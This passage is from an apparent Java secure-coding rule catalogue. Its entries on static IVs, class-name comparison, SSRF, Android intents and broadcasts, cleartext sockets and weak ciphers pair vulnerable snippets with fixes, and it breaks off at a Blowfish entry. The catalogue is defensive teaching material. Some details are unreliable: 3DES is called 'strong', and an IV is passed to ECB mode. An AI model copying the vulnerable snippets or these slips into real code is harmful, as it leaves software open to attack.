                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7562">Static IV</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Static IV</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Initialization vector must be regenerated for each message to be encrypted.
</p>
<p><b>Vulnerable Code:</b></p>
<p>
<pre>
private static byte[] IV = new byte[16] {(byte)0,(byte)1,(byte)2,[...]};</pre></p>
<p>public void encrypt(String message) throws Exception {</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>IvParameterSpec ivSpec = new IvParameterSpec(IV);
</pre></div>
</td></tr></table>
<p>[...]
</p></p>
<p><b>Solution:</b></p>
<p>
<pre>
public void encrypt(String message) throws Exception {</pre></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span>byte[] iv = new byte[16];
new SecureRandom().nextBytes(iv);

IvParameterSpec ivSpec = new IvParameterSpec(iv);
</pre></div>
</td></tr></table>
<p>[...]
</p>

<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>critical</p>
<h1 id="references">References</h1>
<p><a href="http://en.wikipedia.org/wiki/Initialization_vector">Wikipedia: Initialization vector</a><br/>
<a href="http://cwe.mitre.org/data/definitions/329.html">CWE-329: Not Using a Random IV with CBC Mode</a><br/>
<a href="https://defuse.ca/cbcmodeiv.htm">Encryption - CBC Mode IV: Secret or Not?</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1073">Code Correctness</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable Code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed COde Example 2</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>In a Java Virtual Machine (JVM), "Two classes are the same class (and consequently the same type) if they are loaded by the same class loader and they have the same fully qualified name" <a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-JVMSpec99">JVMSpec 1999</a>. Two classes with the same name but different package names are distinct, as are two classes with the same fully qualified name loaded by different class loaders.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>It could be necessary to check whether a given object has a specific class type or whether two objects have the same class type associated with them, for example, when implementing the equals() method. If the comparison is performed incorrectly, the code could assume that the two objects are of the same class when they are not. As a result, class names must not be compared.</p>
<p>Depending on the function that the insecure code performs, it could be vulnerable to a mix-and-match attack.</p>
<p>Conversely, the assumption that two classes deriving from the same codebase are the same is error prone. Although this assumption is commonly observed to be true in desktop applications, it is typically not the case with J2EE servlet containers. The containers can use different class loader instances to deploy and recall applications at runtime without having to restart the JVM.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Use class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example compares the name of the class of object auth to the string "com.application.auth.DefaultAuthenticationHandler" and branches on the result of the comparison:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Determine whether object auth has required/expected class object</span>
 <span class="k">if</span> <span class="o">(</span><span class="n">auth</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span>
      <span class="s">"com.application.auth.DefaultAuthenticationHandler"</span><span class="o">))</span> <span class="o">{</span>
   <span class="c1">// ...</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Comparing fully qualified class names is insufficient because distinct class loaders can load differing classes with identical fully qualified names into a single JVM.</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution compares the class object auth to the class object for the canonical default authentication handler:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Determine whether object auth has required/expected class name</span>
 <span class="k">if</span> <span class="o">(</span><span class="n">auth</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">==</span> <span class="n">com</span><span class="o">.</span><span class="na">application</span><span class="o">.</span><span class="na">auth</span><span class="o">.</span><span class="na">DefaultAuthenticationHandler</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
   <span class="c1">// ...</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The right-hand side of the comparison directly names the class of the canonical authentication handler. In the event that the canonical authentication handler had not yet been loaded, the Java runtime manages the process of loading the class. Finally, the comparison is correctly performed on the two class objects.</p>
<h3 id="vulnerable-code-example-2">Vulnerable Code Example 2</h3>
<p>This noncompliant code example compares the names of the class objects of x and y using the equals() method. Again, it is possible that x and y are distinct classes with the same name if they come from different class loaders.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Determine whether objects x and y have the same class name</span>
<span class="k">if</span> <span class="o">(</span><span class="n">x</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">y</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
  <span class="c1">// Objects have the same class</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-2">Fixed COde Example 2</h3>
<p>This compliant solution correctly compares the two objects' classes:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Determine whether objects x and y have the same class</span>
<span class="k">if</span> <span class="o">(</span><span class="n">x</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">==</span> <span class="n">y</span><span class="o">.</span><span class="na">getClass</span><span class="o">())</span> <span class="o">{</span>
  <span class="c1">// Objects have the same class</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/OBJ09-J.+Compare+classes+and+not+class+names <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/486.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7029">Usage of GetResource may be unsafe if class is extended</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Usage of GetResource may be unsafe if class is extended</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>Calling <code>this.getClass().getResource(...)</code> could give
results other than expected if this class is extended by a class in
another package.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7008">HTTP cookie formed from untrusted input</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>HTTP cookie formed from untrusted input</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>This code constructs an HTTP Cookie using an untrusted HTTP parameter. If this cookie is added to an HTTP response, it will allow a HTTP response splitting
vulnerability. See <a href="http://en.wikipedia.org/wiki/HTTP_response_splitting">http://en.wikipedia.org/wiki/HTTP_response_splitting</a>
for more information.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1077">Server-Side Request Forgery</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Implement a whiltelist of allowed domains and protocols for remote resource fetching.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/918.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1110">Intent Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Attackers can exploit the vulnerabilities in Intent parameters so as to control the subsequent activities.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. </p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>The vulnerable code below uses user input directly from an HTTP request without first verifying it:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">String</span> <span class="n">cName</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"className"</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
<span class="o">...</span>
<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">cName</span><span class="o">);</span>
<span class="n">someContext</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/99.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7481">Untrusted Content-Type header</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Untrusted Content-Type header</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
The HTTP header Content-Type can be controlled by the client. As such, its value should not be used in any security critical decisions.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/807.html">CWE-807: Untrusted Inputs in a Security Decision</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7539">Unencrypted Socket</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Unencrypted Socket</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
The communication channel used is not encrypted. The traffic could be read by an attacker intercepting the network traffic.
</p>
<p>
<b>Vulnerable Code:</b><br/>
Plain socket (Cleartext communication):
<pre>Socket soc = new Socket("www.google.com",80);</pre>
</p>
<p>
<b>Solution:</b><br/>
SSL Socket (Secure communication):
<pre>Socket soc = SSLSocketFactory.getDefault().createSocket("www.google.com", 443);</pre>
</p>
<p>Beyond using an SSL socket, you need to make sure your use of SSLSocketFactory does all the appropriate certificate validation checks to
make sure you are not subject to man-in-the-middle attacks. Please read the OWASP Transport Layer Protection Cheat Sheet for details on how
to do this correctly.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>critical</p>
<h1 id="references">References</h1>
<p><a href="https://www.owasp.org/index.php/Top_10_2010-A9">OWASP: Top 10 2010-A9-Insufficient Transport Layer Protection</a><br/>
<a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br/>
<a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet">OWASP: Transport Layer Protection Cheat Sheet</a><br/>
<a href="http://projects.webappsec.org/w/page/13246945/Insufficient%20Transport%20Layer%20Protection">WASC-04: Insufficient Transport Layer Protection</a><br/>
<a href="http://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7542">DESede is insecure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>DESede is insecure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Triple DES (also known as 3DES or DESede) is considered strong ciphers for modern applications. Currently, NIST recommends the
usage of AES block ciphers instead of 3DES.
</p>
<p>
<b>Example weak code:</b>
<pre>Cipher c = Cipher.getInstance("DESede/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p>
<p>
<b>Example solution:</b>
<pre>Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
c.init(Cipher.ENCRYPT_MODE, k, iv);
byte[] cipherText = c.doFinal(plainText);</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://www.nist.gov/itl/fips/060205_des.cfm">NIST Withdraws Outdated Data Encryption Standard</a><br/>
<a href="http://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7576">Broadcast (Android)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Broadcast (Android)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Broadcast intents can be listen by any application with the appropriate permission. It is suggested to avoid transmitting
    sensitive information when possible.
</p>
<p>
<b>Code at risk:</b><br/>
<pre>
Intent i = new Intent();
i.setAction("com.insecure.action.UserConnected");
i.putExtra("username", user);
i.putExtra("email", email);
i.putExtra("session", newSessionId);</pre></p>
<p>this.sendBroadcast(v1);
</p></p>

<br/>
<p>
<b>Solution (if possible):</b><br/>
<pre>
Intent i = new Intent();
i.setAction("com.secure.action.UserConnected");</pre></p>
<p>sendBroadcast(v1);
</p>

<br/>
<p>
<b>Configuration (receiver)<sup>[1] Source: StackOverflow</sup>:</b><br/>
<pre>
&lt;manifest ...&gt;</pre></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">&amp;</span><span class="nt">lt</span><span class="o">;!</span><span class="nt">--</span> <span class="nt">Permission</span> <span class="nt">declaration</span> <span class="nt">--</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span>
<span class="o">&amp;</span><span class="nt">lt</span><span class="o">;</span><span class="nt">permission</span> <span class="nt">android</span><span class="p">:</span><span class="nd">name</span><span class="o">=</span><span class="s2">"my.app.PERMISSION"</span> <span class="o">/&amp;</span><span class="nt">gt</span><span class="o">;</span>

<span class="o">&amp;</span><span class="nt">lt</span><span class="o">;</span><span class="nt">receiver</span>
    <span class="nt">android</span><span class="p">:</span><span class="nd">name</span><span class="o">=</span><span class="s2">"my.app.BroadcastReceiver"</span>
    <span class="nt">android</span><span class="p">:</span><span class="nd">permission</span><span class="o">=</span><span class="s2">"my.app.PERMISSION"</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span> <span class="o">&amp;</span><span class="nt">lt</span><span class="o">;!</span><span class="nt">--</span> <span class="nt">Permission</span> <span class="nt">enforcement</span> <span class="nt">--</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span>
    <span class="o">&amp;</span><span class="nt">lt</span><span class="o">;</span><span class="nt">intent-filter</span><span class="o">&gt;</span>
        <span class="o">&amp;</span><span class="nt">lt</span><span class="o">;</span><span class="nt">action</span> <span class="nt">android</span><span class="p">:</span><span class="nd">name</span><span class="o">=</span><span class="s2">"com.secure.action.UserConnected"</span> <span class="o">/&amp;</span><span class="nt">gt</span><span class="o">;</span>
    <span class="o">&amp;</span><span class="nt">lt</span><span class="o">;/</span><span class="nt">intent-filter</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span>
<span class="o">&amp;</span><span class="nt">lt</span><span class="o">;/</span><span class="nt">receiver</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span>

<span class="o">...</span>
</pre></div>
</td></tr></table>
<p>&lt;/manifest&gt;
</p>

<p>
<b>Configuration (sender)<sup>[1] Source: StackOverflow</sup>:</b><br/>
<pre>
&lt;manifest&gt;
    &lt;!-- We declare we own the permission to send broadcast to the above receiver --&gt;
    &lt;uses-permission android:name="my.app.PERMISSION"/&gt;</pre></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">&amp;</span><span class="nt">lt</span><span class="o">;!</span><span class="nt">--</span> <span class="nt">With</span> <span class="nt">the</span> <span class="nt">following</span> <span class="nt">configuration</span><span class="o">,</span> <span class="nt">both</span> <span class="nt">the</span> <span class="nt">sender</span> <span class="nt">and</span> <span class="nt">the</span> <span class="nt">receiver</span> <span class="nt">apps</span> <span class="nt">need</span> <span class="nt">to</span> <span class="nt">be</span> <span class="nt">signed</span> <span class="nt">by</span> <span class="nt">the</span> <span class="nt">same</span> <span class="nt">developer</span> <span class="nt">certificate</span><span class="o">.</span> <span class="nt">--</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span>
<span class="o">&amp;</span><span class="nt">lt</span><span class="o">;</span><span class="nt">permission</span> <span class="nt">android</span><span class="p">:</span><span class="nd">name</span><span class="o">=</span><span class="s2">"my.app.PERMISSION"</span> <span class="nt">android</span><span class="p">:</span><span class="nd">protectionLevel</span><span class="o">=</span><span class="s2">"signature"</span><span class="o">/&amp;</span><span class="nt">gt</span><span class="o">;</span>
</pre></div>
</td></tr></table>
<p>&lt;/manifest&gt;
</p>

<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://www.securecoding.cert.org/confluence/display/java/DRD03-J.+Do+not+broadcast+sensitive+information+using+an+implicit+intent">CERT: DRD03-J. Do not broadcast sensitive information using an implicit intent</a><br/>
<a href="http://developer.android.com/reference/android/content/BroadcastReceiver.html#Security">Android Official Doc: BroadcastReceiver (Security)</a><br/>
<a href="http://developer.android.com/guide/topics/manifest/receiver-element.html">Android Official Doc: Receiver configuration (see <code>android:permission</code>)</a><br/>
<sup>[1]</sup> <a href="http://stackoverflow.com/a/21513368/89769">StackOverflow: How to set permissions in broadcast sender and receiver in android</a><br/>
<a href="https://cwe.mitre.org/data/definitions/925.html">CWE-925: Improper Verification of Intent by Broadcast Receiver</a><br/>
<a href="https://cwe.mitre.org/data/definitions/927.html">CWE-927: Use of Implicit Intent for Sensitive Communication</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7550">Blowfish usage with short key</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Blowfish usage with short key</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
The Blowfish cipher supports keysizes from 32 bits to 448 bits. A small key size makes the ciphertext vulnerable to brute force attacks.
At least 128 bits of entropy should be used when generating the key if use of Blowfish is required.
</p>
<p>
If the algorithm can be changed, the AES block cipher should be used instead.
</p></p>
<p><b>Vulnerable Code:</b><br/>
